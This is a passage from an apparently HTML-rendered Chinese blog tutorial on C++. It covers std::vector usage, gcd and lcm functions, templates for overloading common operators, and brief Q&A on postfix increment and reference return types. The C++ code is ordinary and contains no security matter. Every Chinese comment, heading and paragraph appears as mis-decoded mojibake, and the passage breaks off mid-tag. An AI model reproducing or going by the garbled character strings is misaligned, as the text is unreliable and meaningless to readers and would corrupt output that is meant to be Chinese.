ä½¿ç”¨at()å‡½æ•°è®¿é—®å…ƒç´ ï¼ˆæä¾›è¾¹ç•Œæ£€æŸ¥ï¼‰</span></span><br><span class="line">    std::cout &lt;&lt; numbers.<span class="built_in">at</span>(<span class="number">2</span>) &lt;&lt; std::endl;  <span class="comment">// è¾“å‡ºï¼š3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿®æ”¹å…ƒç´ çš„å€¼</span></span><br><span class="line">    numbers[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è·å–<code>vector</code>çš„å¤§å°å’Œè¿­ä»£è®¿é—®</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–vectorçš„å¤§å°</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Size: &quot;</span> &lt;&lt; numbers.<span class="built_in">size</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨è¿­ä»£å™¨éå†vector</span></span><br><span class="line">    <span class="keyword">for</span> (std::vector&lt;<span class="type">int</span>&gt;::iterator it = numbers.<span class="built_in">begin</span>(); it != numbers.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">        std::cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨èŒƒå›´-based forå¾ªç¯éå†vectorï¼ˆC++11åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : numbers) &#123;</span><br><span class="line">        std::cout &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ’å…¥å’Œåˆ é™¤å…ƒç´ </strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ </span></span><br><span class="line">    numbers.<span class="built_in">insert</span>(numbers.<span class="built_in">begin</span>() + <span class="number">2</span>, <span class="number">10</span>);  <span class="comment">// åœ¨ç´¢å¼•ä¸º2çš„ä½ç½®æ’å…¥10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨æœ«å°¾æ·»åŠ å…ƒç´ </span></span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ </span></span><br><span class="line">    numbers.<span class="built_in">erase</span>(numbers.<span class="built_in">begin</span>() + <span class="number">1</span>);  <span class="comment">// åˆ é™¤ç´¢å¼•ä¸º1çš„å…ƒç´ </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ é™¤æœ«å°¾çš„å…ƒç´ </span></span><br><span class="line">    numbers.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; numbers = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åœ¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ </span></span><br><span class="line">        numbers.insert(numbers.begin() + <span class="number">2</span>, <span class="number">10</span>);  <span class="comment">// åœ¨ç´¢å¼•ä¸º2çš„ä½ç½®æ’å…¥10</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// åœ¨æœ«å°¾æ·»åŠ å…ƒç´ </span></span><br><span class="line">        numbers.push_back(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ </span></span><br><span class="line">        numbers.erase(numbers.begin() + <span class="number">1</span>);  <span class="comment">// åˆ é™¤ç´¢å¼•ä¸º1çš„å…ƒç´ </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ é™¤æœ«å°¾çš„å…ƒç´ </span></span><br><span class="line">        numbers.pop_back();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : numbers) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å…¬å€æ•°ä»¥åŠå…¬çº¦æ•°"><a href="#å…¬å€æ•°ä»¥åŠå…¬çº¦æ•°" class="headerlink" title="å…¬å€æ•°ä»¥åŠå…¬çº¦æ•°"></a>å…¬å€æ•°ä»¥åŠå…¬çº¦æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ±‚æœ€å¤§å…¬çº¦æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> gcd(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ±‚æœ€å°å…¬å€æ•°</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">lcm</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a / gcd(a, b) * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="é‡è½½æ ¼å¼"><a href="#é‡è½½æ ¼å¼" class="headerlink" title="é‡è½½æ ¼å¼"></a>é‡è½½æ ¼å¼</h3><p>åœ¨C++ä¸­ï¼Œè¿ç®—ç¬¦é‡è½½æ˜¯ä¸€ç§å…è®¸ä¸ºå·²æœ‰çš„è¿ç®—ç¬¦æä¾›ç”¨æˆ·å®šä¹‰çš„å®ç°çš„è¯­è¨€ç‰¹æ€§ã€‚è¿™ä½¿å¾—å¼€å‘è€…å¯ä»¥å¯¹è‡ªå®šä¹‰æ•°æ®ç±»å‹ä½¿ç”¨æ ‡å‡†è¿ç®—ç¬¦ã€‚ä¸‹é¢æä¾›äº†ä¸€äº›å¸¸è§è¿ç®—ç¬¦çš„é‡è½½æ ¼å¼ï¼ŒåŒ…æ‹¬æˆå‘˜å‡½æ•°å’Œéæˆå‘˜å‡½æ•°ï¼ˆåŒ…æ‹¬å‹å…ƒå‡½æ•°ï¼‰çš„é‡è½½æ–¹å¼ã€‚</p><h3 id="1-åŠ æ³•è¿ç®—ç¬¦ï¼ˆ-ï¼‰"><a href="#1-åŠ æ³•è¿ç®—ç¬¦ï¼ˆ-ï¼‰" class="headerlink" title="1. åŠ æ³•è¿ç®—ç¬¦ï¼ˆ+ï¼‰"></a>1. åŠ æ³•è¿ç®—ç¬¦ï¼ˆ<code>+</code>ï¼‰</h3><p><strong>æˆå‘˜å‡½æ•°å½¢å¼</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass <span class="keyword">operator</span>+(<span class="type">const</span> MyClass&amp; rhs) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="comment">// è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œæ˜¯å½“å‰å¯¹è±¡å’Œrhsçš„å’Œ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">MyClass</span>(<span class="comment">/* æ„é€ é€»è¾‘ */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>éæˆå‘˜ï¼ˆå‹å…ƒï¼‰å‡½æ•°å½¢å¼</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> MyClass <span class="keyword">operator</span>+(<span class="type">const</span> MyClass&amp; lhs, <span class="type">const</span> MyClass&amp; rhs) &#123;</span><br><span class="line">        <span class="comment">// è¿”å›lhså’Œrhsçš„å’Œ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">MyClass</span>(<span class="comment">/* æ„é€ é€»è¾‘ */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-èµ‹å€¼è¿ç®—ç¬¦ï¼ˆ-ï¼‰"><a href="#2-èµ‹å€¼è¿ç®—ç¬¦ï¼ˆ-ï¼‰" class="headerlink" title="2. èµ‹å€¼è¿ç®—ç¬¦ï¼ˆ=ï¼‰"></a>2. èµ‹å€¼è¿ç®—ç¬¦ï¼ˆ<code>=</code>ï¼‰</h3><p><strong>æˆå‘˜å‡½æ•°å½¢å¼</strong>ï¼ˆåªèƒ½æ˜¯æˆå‘˜å‡½æ•°ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass&amp; <span class="keyword">operator</span>=(<span class="type">const</span> MyClass&amp; rhs) &#123;</span><br><span class="line">        <span class="comment">// èµ‹å€¼é€»è¾‘</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;  <span class="comment">// è¿”å›å½“å‰å¯¹è±¡çš„å¼•ç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="3-ä¸‹æ ‡è¿ç®—ç¬¦ï¼ˆ-ï¼‰"><a href="#3-ä¸‹æ ‡è¿ç®—ç¬¦ï¼ˆ-ï¼‰" class="headerlink" title="3. ä¸‹æ ‡è¿ç®—ç¬¦ï¼ˆ[]ï¼‰"></a>3. ä¸‹æ ‡è¿ç®—ç¬¦ï¼ˆ<code>[]</code>ï¼‰</h3><p><strong>æˆå‘˜å‡½æ•°å½¢å¼</strong>ï¼ˆåªèƒ½æ˜¯æˆå‘˜å‡½æ•°ï¼‰ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ElementType&amp; <span class="keyword">operator</span>[](<span class="type">int</span> index) &#123;</span><br><span class="line">        <span class="comment">// è¿”å›å¯¹åº”ç´¢å¼•çš„å…ƒç´ çš„å¼•ç”¨</span></span><br><span class="line">        <span class="keyword">return</span> elements[index];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-é€’å¢è¿ç®—ç¬¦ï¼ˆ-ï¼‰"><a href="#4-é€’å¢è¿ç®—ç¬¦ï¼ˆ-ï¼‰" class="headerlink" title="4. é€’å¢è¿ç®—ç¬¦ï¼ˆ++ï¼‰"></a>4. é€’å¢è¿ç®—ç¬¦ï¼ˆ<code>++</code>ï¼‰</h3><p><strong>å‰ç¼€é€’å¢</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass&amp; <span class="keyword">operator</span>++() &#123;</span><br><span class="line">        <span class="comment">// é€’å¢é€»è¾‘</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>åç¼€é€’å¢</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass <span class="keyword">operator</span>++(<span class="type">int</span>) &#123;</span><br><span class="line">        MyClass temp = *<span class="keyword">this</span>;</span><br><span class="line">        <span class="comment">// é€’å¢é€»è¾‘</span></span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="5-è¾“å‡ºè¿ç®—ç¬¦ï¼ˆ"><a href="#5-è¾“å‡ºè¿ç®—ç¬¦ï¼ˆ" class="headerlink" title="5. è¾“å‡ºè¿ç®—ç¬¦ï¼ˆ&lt;&lt;ï¼‰å¸¸ç”¨äºè¾“å‡ºæµé‡è½½"></a>5. è¾“å‡ºè¿ç®—ç¬¦ï¼ˆ<code>&lt;&lt;</code>ï¼‰å¸¸ç”¨äºè¾“å‡ºæµé‡è½½</h3><p><strong>éæˆå‘˜ï¼ˆå‹å…ƒï¼‰å‡½æ•°å½¢å¼</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> MyClass&amp; obj) &#123;</span><br><span class="line">        <span class="comment">// è¾“å‡ºobjçš„ä¿¡æ¯åˆ°os</span></span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="6-æ¯”è¾ƒè¿ç®—ç¬¦ï¼ˆ-ï¼‰"><a href="#6-æ¯”è¾ƒè¿ç®—ç¬¦ï¼ˆ-ï¼‰" class="headerlink" title="6. æ¯”è¾ƒè¿ç®—ç¬¦ï¼ˆ==ï¼‰"></a>6. æ¯”è¾ƒè¿ç®—ç¬¦ï¼ˆ<code>==</code>ï¼‰</h3><p><strong>æˆå‘˜å‡½æ•°å½¢å¼</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> MyClass&amp; rhs) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="comment">// è¿”å›æ¯”è¾ƒç»“æœ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="comment">/* æ¯”è¾ƒé€»è¾‘ */</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>éæˆå‘˜ï¼ˆå‹å…ƒï¼‰å‡½æ•°å½¢å¼</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> MyClass&amp; lhs, <span class="type">const</span> MyClass&amp; rhs) &#123;</span><br><span class="line">        <span class="comment">// è¿”å›æ¯”è¾ƒç»“æœ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="comment">/* æ¯”è¾ƒé€»è¾‘ */</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™äº›ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•é‡è½½å¸¸è§è¿ç®—ç¬¦ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œé€‰æ‹©æˆå‘˜å‡½æ•°è¿˜æ˜¯å‹å…ƒå‡½æ•°å½¢å¼ï¼Œé€šå¸¸å–å†³äºæ˜¯å¦éœ€è¦è®¿é—®ç§æœ‰æˆå‘˜ï¼Œä»¥åŠæ˜¯å¦å¸Œæœ›ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ç±»ç±»å‹çš„å¯¹è±¡ã€‚æ€»çš„æ¥è¯´ï¼Œè¿ç®—ç¬¦é‡è½½åº”è¯¥è°¨æ…ä½¿ç”¨ï¼Œä»¥ä¿æŒä»£ç çš„ç›´è§‚å’Œæ˜“äºç†è§£ã€‚</p><h4 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h4><h5 id="ä¸ºä»€ä¹ˆé€‰æ‹©-int-ä½œä¸ºå‚æ•°ï¼Ÿï¼ˆåç½®-ï¼‰"><a href="#ä¸ºä»€ä¹ˆé€‰æ‹©-int-ä½œä¸ºå‚æ•°ï¼Ÿï¼ˆåç½®-ï¼‰" class="headerlink" title="ä¸ºä»€ä¹ˆé€‰æ‹© int ä½œä¸ºå‚æ•°ï¼Ÿï¼ˆåç½®++ï¼‰"></a>ä¸ºä»€ä¹ˆé€‰æ‹© <code>int</code> ä½œä¸ºå‚æ•°ï¼Ÿï¼ˆåç½®++ï¼‰</h5><ol><li><strong>è¯­æ³•è§„å®š</strong>ï¼šC++è¯­è¨€è§„èŒƒå®šä¹‰äº†åç¼€é€’å¢è¿ç®—ç¬¦çš„é‡è½½å¿…é¡»ä½¿ç”¨ä¸€ä¸ª<code>int</code>ç±»å‹çš„å‚æ•°ã€‚è¿™ä¸ªå‚æ•°çš„å­˜åœ¨æ˜¯ä¸ºäº†è¯­æ³•ä¸Šçš„éœ€è¦ï¼Œä»¥ä¾¿ç¼–è¯‘å™¨èƒ½å¤ŸåŒºåˆ†åç¼€é€’å¢ï¼ˆ<code>operator++(int)</code>ï¼‰å’Œå‰ç¼€é€’å¢ï¼ˆ<code>operator++()</code>ï¼‰ã€‚</li><li><strong>å ä½ç¬¦ç”¨é€”</strong>ï¼šè¿™ä¸ª<code>int</code>å‚æ•°å®é™…ä¸Šæ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå®ƒä¸éœ€è¦è¢«èµ‹äºˆä»»ä½•å®é™…çš„å€¼ã€‚åœ¨è°ƒç”¨åç¼€é€’å¢æ—¶ï¼Œé€šå¸¸ä¼ é€’çš„æ˜¯ä¸€ä¸ªå­—é¢å€¼0ï¼Œä½†è¿™ä¸ªå€¼åœ¨å®é™…çš„è¿ç®—ç¬¦å®ç°ä¸­é€šå¸¸æ˜¯è¢«å¿½ç•¥çš„ã€‚</li></ol><h5 id="ä¸ºä»€ä¹ˆMyClass-æ˜¯-ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆMyClass-æ˜¯-ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆMyClass&amp;æ˜¯&amp;ï¼Ÿ"></a>ä¸ºä»€ä¹ˆMyClass&amp;æ˜¯&amp;ï¼Ÿ</h5><p>åœ¨C++ä¸­ï¼Œä½¿ç”¨å¼•ç”¨è¿”å›ç±»å‹ï¼ˆä¾‹å¦‚ <code>MyClass&amp;</code>ï¼‰åœ¨è¿ç®—ç¬¦é‡è½½å’Œå…¶ä»–æ–¹æ³•ä¸­æ˜¯ä¸€ç§å¸¸è§çš„åšæ³•ï¼Œå°¤å…¶æ˜¯åœ¨èµ‹å€¼è¿ç®—ç¬¦å’Œå‰ç¼€é€’å¢&#x2F;é€’å‡è¿ç®—ç¬¦ä¸­ã€‚è¿™æ ·åšæœ‰å‡ ä¸ªé‡è¦çš„åŸå› å’Œä¼˜åŠ¿ï¼š</p><h5 id="1-é¿å…ä¸å¿…è¦çš„å¯¹è±¡å¤åˆ¶"><a href="#1-é¿å…ä¸å¿…è¦çš„å¯¹è±¡å¤åˆ¶" class="headerlink" title="1. é¿å…ä¸å¿…è¦çš„å¯¹è±¡å¤åˆ¶"></a>1. é¿å…ä¸å¿…è¦çš„å¯¹è±¡å¤åˆ¶</h5><p>å½“å‡½æ•°è¿”å›ç±»å‹æ˜¯ä¸€ä¸ªå¯¹è±¡è€Œä¸æ˜¯å¼•ç”¨æ—¶ï¼ŒC++æ ‡å‡†é€šå¸¸è¦æ±‚è¿”å›å€¼è¢«å¤åˆ¶æˆ–ç§»åŠ¨åˆ°è°ƒç”¨æ–¹çš„å˜é‡ä¸­ã€‚å¦‚æœè¿”å›ç±»å‹æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œè¿™ç§å¤åˆ¶å¯ä»¥è¢«é¿å…ã€‚å¯¹äºåŒ…å«å¤§é‡æ•°æ®æˆ–å¤æ‚èµ„æºç®¡ç†çš„ç±»æ¥è¯´ï¼Œé¿å…è¿™ç§å¤åˆ¶æ˜¯æé«˜æ€§èƒ½çš„å…³é”®ã€‚</p><h5 id="2-å…è®¸é“¾å¼è°ƒç”¨"><a href="#2-å…è®¸é“¾å¼è°ƒç”¨" class="headerlink" title="2. å…è®¸é“¾å¼è°ƒç”¨"></a>2. å…è®¸é“¾å¼è°ƒç”¨</h5><p>è¿”å›å¯¹è±¡çš„å¼•ç”¨å…è®¸æ–¹æ³•è°ƒç”¨å¯ä»¥è¢«é“¾å¼è¿æ¥èµ·æ¥ã€‚è¿™æ˜¯å› ä¸ºè¿”å›çš„å¼•ç”¨æŒ‡å‘è°ƒç”¨å¯¹è±¡æœ¬èº«ï¼Œæ‰€ä»¥å¯ä»¥ç»§ç»­åœ¨åŒä¸€ä¸ªè¡¨è¾¾å¼ä¸­å¯¹å…¶è¿›è¡Œæ“ä½œã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myObject.<span class="built_in">Increment</span>().<span class="built_in">SetSomething</span>(<span class="number">5</span>).<span class="built_in">DoAnotherThing</span>();</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ<code>Increment</code>ã€<code>SetSomething</code> å’Œ <code>DoAnotherThing</code> éƒ½å¯èƒ½è¿”å› <code>MyClass&amp;</code>ï¼Œå…è®¸è¿ç»­è°ƒç”¨ã€‚</p><h5 id="3-ä¿æŒæ“ä½œç¬¦çš„é¢„æœŸè¡Œä¸º"><a href="#3-ä¿æŒæ“ä½œç¬¦çš„é¢„æœŸè¡Œä¸º" class="headerlink" title="3. ä¿æŒæ“ä½œç¬¦çš„é¢„æœŸè¡Œä¸º"></a>3. ä¿æŒæ“ä½œç¬¦çš„é¢„æœŸè¡Œä¸º</h5><p>å¯¹äºæŸäº›æ“ä½œç¬¦ï¼Œå¦‚èµ‹å€¼ (<code>=</code>)ã€å‰ç¼€é€’å¢ (<code>++</code>) å’Œå‰ç¼€é€’å‡ (<code>--</code>)ï¼ŒæŒ‰ç…§æƒ¯ä¾‹å’Œé¢„æœŸï¼Œè¿™äº›æ“ä½œåº”è¯¥ä¿®æ”¹åŸå§‹å¯¹è±¡ï¼Œå¹¶è¿”å›ä¿®æ”¹åçš„å¯¹è±¡çš„å¼•ç”¨ã€‚è¿™æ ·ï¼Œæ“ä½œçš„ç»“æœå¯ä»¥ç›´æ¥ç”¨äºå…¶ä»–æ“ä½œï¼Œæ¨¡ä»¿äº†å†…ç½®ç±»å‹çš„è¡Œä¸ºã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 